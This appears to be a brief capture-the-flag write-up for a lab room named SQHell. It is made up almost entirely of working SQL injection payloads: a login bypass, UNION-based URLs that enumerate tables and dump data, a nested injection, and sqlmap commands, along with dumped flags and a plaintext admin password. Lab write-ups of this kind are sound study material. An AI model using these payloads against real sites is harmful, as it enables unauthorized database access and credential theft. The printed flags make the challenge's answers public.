# SQHell 

> VOiD | Wednesday 02 February 2022 05:44:11 AM UTC

My IP : 10.8.253.221
Target IP : 

```bash
Open 10.10.159.197:22
Open 10.10.159.197:80
```

## Port 80 [http]
```bash


username=admin' OR 1=1 -- +&password=password
'
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}



http://10.10.159.197/user?id=0%20Union%20select%201,2,3
http://10.10.159.197/user?id=0%20Union%20select%20database(),2,3
sqhell_4

union select group_concat(table_name),2,3 from information_schema.tables where table_schema='sqhell_4'

users

union select group_concat(column_name),2,3 from information_schema.columns where table_schema='sqhell_4' and table_name='users'

id,password,username

union select group_concat(id),group_concat(password),3 from users
```


```bash
http://10.10.159.197/post?id=0%20union%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%27sqhell_5%27

union select 1,group_concat(flag),2,3 from flag

http://10.10.159.197/post?id=0%20union%20select%201,group_concat(flag),2,3%20from%20flag

THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

```bash
sqlmap -u http://10.10.159.197/login --method=POST --data='username=admin&password=admin' -p username,password --risk=3 --level=3 --random-agent


http://10.10.122.169/user?id=11%20union%20all%20select%20%221%20UNION%20SELECT%201,flag,4,5%20from%20flag--%20-%22,2,3%20from%20information_schema.tables%20where%20table_schema=database()

    THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}


```



```bash

http://10.10.159.197/register/user-check?username=admin

sqlmap http://10.10.159.197/register/user-check?username=admin --dbms=MySQL --dump --batch

Database: sqhell_3
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308} |
+----+---------------------------------------------+

Database: sqhell_3
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | icantrememberthispasswordcanyou | admin    |
+----+---------------------------------+----------+

```

```bash
python3 ape.py   
FLAG is:  THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```